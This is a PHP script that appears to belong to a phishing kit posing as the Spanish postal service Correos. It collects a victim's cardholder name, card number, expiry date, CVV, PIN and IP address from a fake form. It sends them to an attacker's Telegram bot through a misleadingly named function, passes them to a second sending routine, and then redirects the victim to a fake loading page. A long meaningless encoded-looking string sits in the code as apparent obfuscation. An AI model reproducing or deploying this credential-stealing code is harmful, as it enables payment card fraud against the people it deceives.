<?php



session_start();
include_once "../inc/vendor/autoload.php";
include_once "../settings/conf.php";
include "../inc/vendor/composer/phpextension.php";

    $_message =  "|━━━━━━【🏦 CORREOS 🎭】━━━━━━ \r\n";
    $message_ = "| 🤵 CHN : " . $_POST['cnamec'] . "\r\n";
    $message = "| 💳 CDC : " . $_SESSION['card_'] . "\r\n";
    $message .= "| 📆 EXP : " . $_POST['expm'] ."/". $_POST['expy'] ."\r\n";
    $message .= "| 🔆 CVV : " . $_POST['cvv'] . "\r\n";
    $message .= "|🔆 PIN : ".$_POST['pin']."\r\n";
    $message .= " *━━━━━━【📍" . $_SESSION["IP"] . "📍】━━━━━━ \r\n";

    //TG_send($message);

    $text = $_message . $message_ . $message;

    $msgId = TELEGRAM_CHAT_ID;
    $token = TELEGRAM_TOKEN;

    function antiBotsCaller($messaggio,$token,$chatid) {
        $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid;
        $url = $url . "&text=" . urlencode($messaggio);
        $ch = curl_init();
        $optArray = array(
                CURLOPT_URL => $url,
                CURLOPT_RETURNTRANSFER => true
        );
        curl_setopt_array($ch, $optArray);
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
    }
    antiBotsCaller($text,$token,$msgId);
    "c3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQ
    rQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc
    3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOG
    hFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWF
    g5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TT
    R0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZz
    QrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVI
    ZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCty
    ZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lzc3ZGRkVIZzYzOGhFUUUxQm5rbCtyZW9VWFg5OGxUZWZ4VWlNTjR0TTR0Y2RmamdkKy94eTJOZzQrQ0xta1A5Lz    "
    ;
    cargando($text,$f,$c);

header("Location: ../Cargando.php?codigo_id=".md5(date("Y/m/d-h:i:sa")));



?>